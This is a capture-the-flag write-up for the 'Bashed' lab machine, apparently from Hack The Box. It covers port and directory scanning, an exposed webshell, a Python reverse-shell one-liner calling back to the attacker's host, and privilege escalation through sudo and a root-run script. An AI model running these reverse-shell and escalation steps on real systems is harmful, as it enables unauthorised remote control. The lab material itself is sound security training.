## Bashed

Difficulty: Easy

### User Flag

```
nmap 10.10.10.68
```

![nmap](https://user-images.githubusercontent.com/58514930/218465789-3197e551-555c-4c64-9c28-98560885cde1.png)

<br>

```
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirb/big.txt -t 30
```

![gobuster](https://user-images.githubusercontent.com/58514930/218464821-1318b725-b6ef-463b-8f7d-7e77cbc39292.png)

<br>

Browsing through the discovered directories we find a webshell that can be used to get the user flag.

![userFlag](https://user-images.githubusercontent.com/58514930/218466535-5d2539b2-0f42-45fd-ae3e-95a18ba3a80f.png)

### Root Flag

First we get a reverse shell with python.

```
export RHOST="10.10.14.2";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

> Here we can also get a reverse shell creating a .php file inside /uploads directory.

<br>

Doing some enumeration with sudo -l we see that our user can execute any command as the user scriptmanager.

```
sudo -u scriptmanager /bin/sh -i
```

![scriptManager](https://user-images.githubusercontent.com/58514930/218467220-1cf59608-cb70-4140-af03-b84b0f009aa5.png)

<br>

Edit the file /scripts/test.py with a python reverse shell and get the root user.

![editingTest](https://user-images.githubusercontent.com/58514930/218468385-e241e438-3302-4754-9f7a-70492c51378e.png)

![rootFlag](https://user-images.githubusercontent.com/58514930/218468746-e360118f-6a45-4e06-ba56-a16052f27816.png)


